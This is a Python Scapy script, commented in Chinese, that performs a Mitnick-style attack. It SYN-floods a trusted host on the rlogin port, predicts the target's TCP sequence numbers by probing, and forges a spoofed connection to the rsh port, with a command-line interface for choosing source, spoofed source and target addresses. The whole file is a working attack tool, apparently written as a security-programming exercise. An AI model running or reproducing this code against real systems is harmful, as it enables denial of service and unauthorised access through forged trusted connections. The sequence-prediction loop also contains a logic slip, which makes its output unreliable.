# -*- coding: utf-8 -*-
"""
Created on Fri Nov  1 14:09:19 2019

@author: Administrator
"""
import optparse
from scapy.all import *



#synFlood攻击即syn泛洪攻击,一直向src发送syn,
#使得目标耗尽资源,填满连接队列,使得目标无法发送TCP-reset
def synFlood(src,tgt):
    for sport in range(1024,65535):
        IPlayer=IP(src=src,dst=tgt)
        TCPlayer=TCP(sport=sport,dport=513)
        pkt= IPlayer / TCPlayer
        send(pkt)
        
        
        
#计算TCP  SYN的seq值,因为以前的synseq与ackseq差值是固定的,
#有助于预测下一个ackseq的值达到攻击伪造的目的
def calTSN(tgt):
    seqNum=0    
    preNum=0    #之前的值previous
    diffSeq=0
    for x in range(1,5):
        if preNum != 0:
            preNum=seqNum
        pkt = IP(dst=tgt) / TCP()
        ans = sr1(pkt,verbose=0)
        seqNum = ans.getlayer(TCP).seq
        diffSeq = seqNum - preNum
        print('[+] TCP Seq Difference: ' + str(diffSeq))
    return seqNum + diffSeq


#伪造一个seq的值,伪造连接
def spoofConn(src,tgt,ack):
    IPlayer=IP(src=src,dst=tgt)
    TCPlayer=TCP(sport=513,dport=514)
    synPkt=IPlayer / TCPlayer
    send(synPkt)
    IPlayer= IP(src=src,dst=tgt)
    TCPlayer=TCP(sport=513,dport=514,ack=ack)
    ackPkt=IPlayer / TCPlayer
    send(ackPkt)


#使用optparse渲染,输入源地址,原地址伪造地址,目标地址进行攻击
#伪造一个与目标相似的-S地址,前提是-S地址的主机要失去TCP-reset的能力

def main():
    parser=optparse.OptionParser('usage%prog '+
                    '-s<src for SYN Flood> -S <src for spoofed connection> '+
                    '-t<target address>')
    parser.add_option('-s',dest='synSpoof',type='string',
                      help='specify src for SYN Flood')
    parser.add_option('-S',dest='srcSpoof',type='string',
                      help='specify src for spoofed connection')
    parser.add_option('-t',dest='tgt',type='string',
                      help='specify target address')
    (options,args)=parser.parse_args()
    if (options.synSpoof == None or options.srcSpoof ==None 
        or options.tgt ==None):
        print(parser.usage)
        exit(0)
        
    else:
        synSpoof=options.synSpoof
        srcSpoof=options.srcSpoof
        tgt=options.tgt
        
    print('[+] Starting SYN Flood to suppress remote server.')
    synFlood(synSpoof,srcSpoof)
    print('[+] Calculating correct TCP Sequence Number.')
    seqNum=calTSN(tgt)+1
    print('[+] spoofing Connection.')
    spoofConn(srcSpoof,tgt,seqNum)
    print('[+] Done.')
    
if __name__=='__main__':
    main()
            




        
##src='10.134.196.22'
#tgt='10.134.196.21'
##synFlood(src,tgt)
#seqNum = 2721620621
##print("[+] NextTCPSequenceNumber to ACK is: " +str(seqNum+1))
#spoofConn(src,tgt,seqNum)